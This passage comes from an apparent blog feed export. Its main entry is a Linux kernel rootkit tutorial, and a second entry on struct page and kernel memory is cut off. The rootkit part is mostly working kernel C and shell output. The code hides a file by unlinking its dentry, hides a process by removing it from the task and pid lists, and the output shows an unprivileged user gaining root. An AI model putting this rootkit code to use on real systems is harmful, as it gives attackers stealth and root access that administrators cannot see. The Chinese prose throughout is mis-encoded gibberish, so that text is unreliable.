cursor-&gt;d_parent, *found = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">spin_lock(&amp;dentry-&gt;d_lock);</span><br><span class="line"><span class="keyword">while</span> ((p = p-&gt;next) != &amp;dentry-&gt;d_subdirs) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">d</span> =</span> list_entry(p, struct dentry, d_child);</span><br><span class="line"><span class="comment">// we must at least skip cursors, to avoid livelocks</span></span><br><span class="line"><span class="keyword">if</span> (d-&gt;d_flags &amp; DCACHE_DENTRY_CURSOR)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (simple_positive(d) &amp;&amp; !--count) &#123;</span><br><span class="line">spin_lock_nested(&amp;d-&gt;d_lock, DENTRY_D_LOCK_NESTED);</span><br><span class="line"><span class="keyword">if</span> (simple_positive(d))</span><br><span class="line">found = dget_dlock(d);</span><br><span class="line">spin_unlock(&amp;d-&gt;d_lock);</span><br><span class="line"><span class="keyword">if</span> (likely(found))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">count = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (need_resched()) &#123;</span><br><span class="line">list_move(&amp;cursor-&gt;d_child, p);</span><br><span class="line">p = &amp;cursor-&gt;d_child;</span><br><span class="line">spin_unlock(&amp;dentry-&gt;d_lock);</span><br><span class="line">cond_resched();</span><br><span class="line">spin_lock(&amp;dentry-&gt;d_lock);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">spin_unlock(&amp;dentry-&gt;d_lock);</span><br><span class="line">dput(last);</span><br><span class="line"><span class="keyword">return</span> found;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡å¯¹<code>scan_positives</code>å‡½æ•°çš„åˆ†æä¼šå‘ç°å…¶é¦–å…ˆ<code>(p = p-&gt;next) != &amp;dentry-&gt;d_subdirs</code>åˆ¤æ–­æ˜¯å¦å·²ç»éå†åˆ°æœ¬èº«ï¼Œéšåé€šè¿‡<code>list_entry</code>å®è·å¾—æœ€ç»ˆçš„<code>dentry</code>å¹¶è¿”å›çš„ï¼Œè¿™é‡Œä½¿ç”¨çš„<code>dentry</code>ä¸­çš„<code>d_child</code>æˆå‘˜ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> &#123;</span></span><br><span class="line"><span class="comment">/* RCU lookup touched fields */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> d_flags;<span class="comment">/* protected by d_lock */</span></span><br><span class="line"><span class="keyword">seqcount_spinlock_t</span> d_seq;<span class="comment">/* per dentry seqlock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_bl_node</span> <span class="title">d_hash</span>;</span><span class="comment">/* lookup hash list */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">d_parent</span>;</span><span class="comment">/* parent directory */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">qstr</span> <span class="title">d_name</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">d_inode</span>;</span><span class="comment">/* Where the name belongs to - NULL is</span></span><br><span class="line"><span class="comment"> * negative */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> d_iname[DNAME_INLINE_LEN];<span class="comment">/* small names */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ref lookup also touches following */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lockref</span> <span class="title">d_lockref</span>;</span><span class="comment">/* per-dentry lock and refcount */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> *<span class="title">d_op</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">d_sb</span>;</span><span class="comment">/* The root of the dentry tree */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> d_time;<span class="comment">/* used by d_revalidate */</span></span><br><span class="line"><span class="keyword">void</span> *d_fsdata;<span class="comment">/* fs-specific data */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_lru</span>;</span><span class="comment">/* LRU list */</span></span><br><span class="line"><span class="keyword">wait_queue_head_t</span> *d_wait;<span class="comment">/* in-lookup ones only */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_child</span>;</span><span class="comment">/* child of parent list */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">d_subdirs</span>;</span><span class="comment">/* our children */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * d_alias and d_rcu can share memory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">d_alias</span>;</span><span class="comment">/* inode alias list */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_bl_node</span> <span class="title">d_in_lookup_hash</span>;</span><span class="comment">/* only for in-lookup ones */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">d_rcu</span>;</span></span><br><span class="line">&#125; d_u;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>å¯èƒ½å‰é¢ç›´æ¥è¯´<code>dentry</code>ç»“æ„ä½“ä¼šæ¯”è¾ƒæ¨¡ç³Šï¼Œæœ€å¥½ç»“åˆç€è¿™ä¸ªç»“æ„ä½“ä»¥åŠæ³¨é‡Šæ¥çœ‹ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20240216153243832.png"                      alt="image-20240216153243832"                ></p><p>ç»“åˆä¸Šå›¾ç›¸ä¿¡å¤§å®¶å¯ä»¥å¾ˆå¿«çš„ç†è§£åˆ°äº†ã€‚</p><p>æ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°†ä¸€ä¸ªæ–‡ä»¶çš„<code>dentry</code>ä»å…¶<code>d_child</code>é“¾è¡¨ä¸­è„±é“¾ï¼Œå°±èƒ½å¤Ÿå®ç°éšè—æ“ä½œäº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hide_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">tagret_file</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">target_dentry</span>;</span></span><br><span class="line"></span><br><span class="line">    tagret_file = filp_open(filename, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!IS_ERR(tagret_file))</span><br><span class="line">    &#123;</span><br><span class="line">        target_dentry = tagret_file-&gt;f_path.dentry;</span><br><span class="line"></span><br><span class="line">        target_dentry-&gt;d_child.next-&gt;prev = target_dentry-&gt;d_child.prev;</span><br><span class="line">        target_dentry-&gt;d_child.prev-&gt;next = target_dentry-&gt;d_child.next;</span><br><span class="line"></span><br><span class="line">        filp_close(tagret_file, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡ä¸Šè¿°ä»£ç å®ç°è„±é“¾æ“ä½œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">~ $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">~ $ ls</span><br><span class="line">bin          home         lib64        root         sys</span><br><span class="line">dev          init         linuxrc      rootfs.cpio  usr</span><br><span class="line">etc          lib          proc         sbin</span><br><span class="line">~ $ ls /dev/ | grep rootkit</span><br><span class="line">~ $ <span class="built_in">echo</span> a &gt; /dev/rootkit</span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=1000(ctf)</span><br><span class="line">~ <span class="comment"># find /dev/ -name &quot;rootkit&quot;</span></span><br><span class="line">~ <span class="comment"># ls</span></span><br><span class="line">bin          home         lib64        root         sys</span><br><span class="line">dev          init         linuxrc      rootfs.cpio  usr</span><br><span class="line">etc          lib          proc         sbin</span><br><span class="line">~ <span class="comment"># </span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ€ç»ˆæˆåŠŸéšè—æ‰äº†<code>/dev/rootkit</code>ä»¥åŠæ ¹ç›®å½•çš„<code>rootkit.ko</code>å¹¶ä¸”å¹¶ä¸ä¼šå½±å“å…¶æ­£å¸¸åŠŸèƒ½ã€‚</p><h3 id="è¿›ç¨‹éšè—"><a href="#è¿›ç¨‹éšè—" class="headerlink" title="è¿›ç¨‹éšè—"></a>è¿›ç¨‹éšè—</h3><p>ææƒçš„æœ€ç»ˆç›®çš„éƒ½æ˜¯è®©æˆ‘ä»¬çš„æŸä¸€ä¸ªè¿›ç¨‹æ‹¥æœ‰rootæƒé™ï¼Œä¸€ä¸ªrootæƒé™çš„è¿›ç¨‹å‘äº¤äºå¤„äºå†…æ ¸æ€çš„æ¨¡å—æ¥è¯´å¯ä»¥åšçš„äº‹æƒ…æ›´å¤šï¼Œä¸è¿‡è¿™ä¸ªè¿›ç¨‹ä¹Ÿæ˜¯å­˜åœ¨è¢«å‘ç°çš„é£é™©ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥éœ€è¦è¿›è¡Œè¿›ç¨‹éšè—ã€‚</p><p>é¦–å…ˆï¼Œä¼—æ‰€å‘¨çŸ¥Linux kernelä¸­çš„PCBå…¶å®æ˜¯<code>task_struct</code>ç»“æ„ä½“ï¼Œå¤šä¸ª task_struct ä¹‹é—´ç›¸äº’è¿æ¥æˆåŒå‘é“¾è¡¨ç»“æ„ï¼Œè‹¥æ˜¯è¿ç»´äººå‘˜é€‰æ‹©éå† task_struct é“¾è¡¨ä¾¿å¾ˆå®¹æ˜“å‘ç°æˆ‘ä»¬çš„æ¶æ„è¿›ç¨‹ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬çš„è¿›ç¨‹ä» task_struct é“¾è¡¨ä¸­æ‘˜é™¤ã€‚</p><p>åŒæ ·çš„ï¼Œè¿ç»´äººå‘˜è‹¥æ˜¯éå† <code>/proc/pid</code> ï¼Œç”šè‡³æ˜¯ç›´æ¥éå†æ‰€æœ‰è¿›ç¨‹å·ï¼Œåˆ™å¾ˆå®¹æ˜“å‘ç°æˆ‘ä»¬çš„æ¶æ„è¿›ç¨‹ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦å°†å…¶ä» pid é“¾è¡¨ä¸­æ‘˜é™¤ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">rootkit_ioctl</span><span class="params">(struct file *__file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> *<span class="title">cur_node</span>;</span></span><br><span class="line"></span><br><span class="line">    spin_lock(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">    cur_node = &amp;current-&gt;pid_links[PIDTYPE_PID];</span><br><span class="line"></span><br><span class="line">    list_del_rcu(&amp;current-&gt;tasks);</span><br><span class="line">    INIT_LIST_HEAD(&amp;current-&gt;tasks);</span><br><span class="line"></span><br><span class="line">    hlist_del_rcu(cur_node);</span><br><span class="line">    INIT_HLIST_NODE(cur_node);</span><br><span class="line">    cur_node-&gt;pprev = &amp;cur_node;</span><br><span class="line"></span><br><span class="line">    spin_unlock(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨ä¸Šè¿°ä»£ç å³å¯åˆ é™¤å½“å‰è¿›ç¨‹çš„pidã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/rootkit&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;faild open rootkit!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åç¼–å†™ä¸€ä¸ªç”¨äºæµ‹è¯•çš„ç”¨æˆ·è¿›ç¨‹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~ $ ./exp&amp;</span><br><span class="line">~ $ ps</span><br><span class="line">PID   USER     TIME  COMMAND</span><br><span class="line">    1 root      0:01 &#123;init&#125; /bin/sh /init kaslr</span><br><span class="line">  <span class="comment"># ... ...</span></span><br><span class="line">  140 ctf       0:00 sh</span><br><span class="line">  142 ctf       0:00 ps</span><br><span class="line">~ $ </span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæˆåŠŸå®ç°è¿›ç¨‹éšè—ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;åœ¨æ¯•ä¸šè®ºæ–‡é€‰é¢˜æ—¶é€‰çš„æ˜¯Linux Rootkitç›¸å…³çš„å†…å®¹ï¼ŒåŠ ä¸Šåœ¨å‰é¢çš„è®¸å¤šæ–‡ç« ä¸­æŒ–äº†è¿™ä¸ªå‘ç»ˆäºæ˜¯ç°åœ¨å¯ä»¥è¿›è¡Œå¡«å‘æ´»åŠ¨äº†ğŸ˜­ï¼&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    
    <category term="LKM" scheme="https://196082.github.io/tags/LKM/"/>
    
  </entry>
  
  <entry>
    <title>Kernelå†…å­˜ç®¡ç†</title>
    <link href="https://196082.github.io/2024/01/24/Kernel%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <id>https://196082.github.io/2024/01/24/Kernel%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</id>
    <published>2024-01-24T09:11:09.000Z</published>
    <updated>2024-01-24T09:10:57.282Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…¶å®è¿™ä¸€ç¯‡æ‰“ç®—çš„æ˜¯å†™<code>syz-fuzzer</code>éƒ¨åˆ†çš„æºç åˆ†ææˆ–è€…æ˜¯<code>Linux Rootkit</code>è¿™ä¸¤ç¯‡ä¸­çš„ä¸€ç¯‡ï¼Œä½†æ˜¯åœ¨å‰ä¸€ç¯‡æ–‡ç« ä¸­è¾ƒä¸ºè¯¦ç»†çš„åˆ†æäº†slubçš„åˆ†é…æµç¨‹ï¼ŒåŠ ä¸Šä¹Ÿæœ‰å‡ ä½å¸ˆå‚…è¯´æˆ‘çš„åšå®¢ç¼ºå°‘åŸºç¡€çŸ¥è¯†ï¼Œè¿™ä¹Ÿå°±è®©æˆ‘æƒ³è¦ä¸æŠŠä¹Ÿè¿™ç¯‡æ–‡ç« ç»™å†™äº†ã€‚è¿™é‡Œè¯´ä¸€ä¸‹ä¸ºä»€ä¹ˆæˆ‘ä¸æ„¿æ„å†™è¿™äº›åŸºç¡€çš„åŸå› ï¼Œåœ¨å­¦æ ¡æœŸé—´æˆ‘ä¸æ„¿æ„å†™çš„ä¸»è¦åŸå› æ˜¯æˆ‘æƒ³è¦ä¸æ–­çš„å­¦ä¹ æ–°ä¸œè¥¿ï¼ˆå¯ä»¥çœ‹åˆ°æˆ‘å‰é¢ç©è¿‡ä»€ä¹ˆqemuï¼Œchromeä¹‹ç±»çš„ï¼‰ï¼Œéšåä¼šè¿‡ä¸€éåŸºç¡€ä½†æ˜¯å†™ä¸‹æ¥å°±ä¼šæœ‰ç‚¹è´¹åŠ›ä¸è®¨å¥½çš„æ„Ÿè§‰ã€‚å®ä¹ ä¹‹åä¸ºä»€ä¹ˆä¸å†™çš„ä¸»è¦åŸå› æ˜¯ï¼Œå†™åŸºç¡€æ˜¯ä¸èƒ½å½“ä½œè¿™ä¸€å‘¨å¹²çš„äº‹å†™è¿›å‘¨æŠ¥çš„ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ä¸Šç­æœŸé—´æˆ‘å¤ç°äº†å¾ˆå¤šCVEå…¶å®åœ¨é‚£ä¹ˆå¤šç¯‡ä¸­ä¹Ÿç©¿æ’äº†è®¸å¤šçš„åŸºç¡€çŸ¥è¯†ï¼Œ<del>å¯¹èµ„æœ¬å®¶çš„æ— å£°æŠµæŠ—äº†å±äºæ˜¯</del>ã€‚</p><p>å½“ç„¶ï¼Œè™½ç„¶å‰é¢ç†ç”±é‚£ä¹ˆå¤šä½†æ˜¯æœ€ä¸¥é‡çš„ä¸€ä¸ªé—®é¢˜è¿˜æ˜¯ï¼Œæ²¡äººçœ‹æˆ‘åšå®¢ğŸ˜­ï¼Œè¿™ä¹Ÿæ˜¯è®©æˆ‘ä¸€ç›´çŠ¯æ‡’çš„åŸå› ï¼ˆä¸è¿‡ç•™ç€è‡ªå·±çœ‹ä¹Ÿæ˜¯å¾ˆå¥½çš„ï¼‰ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/OrsvS6GTMgPLx5E.png"                                     ></p><h2 id="struct-page"><a href="#struct-page" class="headerlink" title="struct page"></a>struct page</h2><p>åœ¨å‰é¢çš„å¾ˆå¤šæ–‡ç« ä¸­éƒ½æåˆ°è¿‡<code>page</code>ç»“æ„ä½“ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ‹¿å‡ºæ¥è¯¦ç»†è§£é‡Šè¿‡ï¼Œè¿™é‡Œä¹Ÿè¯¦ç»†çš„é˜è¿°ä¸€ä¸‹å§ã€‚åœ¨ <a class="link"   href="https://cv196082.gitee.io/2023/05/24/pipe-buffer/" >å‘pipe_bufferè¯´yesï¼<i class="fas fa-external-link-alt"></i></a> æ–‡ç« ä¸­æˆ‘ä»¬æ˜¯ä½¿ç”¨<code>off by null</code>å¯¼è‡´ä¸¤ä¸ª<code>pipe_buffer-&gt;page</code>æŒ‡é’ˆæŒ‡å‘äº†åŒä¸€ä¸ªpageç»“æ„ä½“ï¼Œè€Œpageç»“æ„ä½“åœ¨ Linux Kernel ä¸­ç”¨äºè¡¨ç¤ºä¸€ä¸ªç‰©ç†é¡µæ¡†åŒæ ·æ¯ä¸ªç‰©ç†é¡µæ¡†ä¹Ÿä¼šå¯¹åº”ä¸€ä¸ªpageç»“æ„ä½“ï¼Œæ­£æ˜¯å› ä¸ºå‰é¢çš„å¯¹åº”å…³ç³»å­˜åœ¨æˆ‘ä»¬æ‰èƒ½å¤Ÿè®©åé¢çš„<code>pipe_buffer</code>ç»“æ„ä½“å»å é¢†å¯¹åº”çš„ç‰©ç†é¡µæ¡†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;<span class="comment">/* Atomic flags, some possibly</span></span><br><span class="line"><span class="comment"> * updated asynchronously */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Five words (20/40 bytes) are available in this union.</span></span><br><span class="line"><span class="comment"> * WARNING: bit 0 of the first word is used for PageTail(). That</span></span><br><span class="line"><span class="comment"> * means the other users of this union MUST NOT use the bit to</span></span><br><span class="line"><span class="comment"> * avoid collision and false-positive PageTail().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* Page cache and anonymous pages */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @lru: Pageout list, eg. active_list protected by</span></span><br><span class="line"><span class="comment"> * lruvec-&gt;lru_lock.  Sometimes used as a generic list</span></span><br><span class="line"><span class="comment"> * by the page owner.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Or, for the Unevictable &quot;LRU list&quot; slot */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="comment">/* Always even, to negate PageTail */</span></span><br><span class="line"><span class="keyword">void</span> *__filler;</span><br><span class="line"><span class="comment">/* Count page&#x27;s or folio&#x27;s mlocks */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> mlock_count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Or, free page */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">buddy_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">pcp_list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* See page-flags.h for PAGE_MAPPING_FLAGS */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">pgoff_t</span> index;<span class="comment">/* Our offset within mapping. */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> share;<span class="comment">/* share count for fsdax */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @private: Mapping-private opaque data.</span></span><br><span class="line"><span class="comment"> * Usually used for buffer_heads if PagePrivate.</span></span><br><span class="line"><span class="comment"> * Used for swp_entry_t if PageSwapCache.</span></span><br><span class="line"><span class="comment"> * Indicates order in the buddy system if PageBuddy.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span 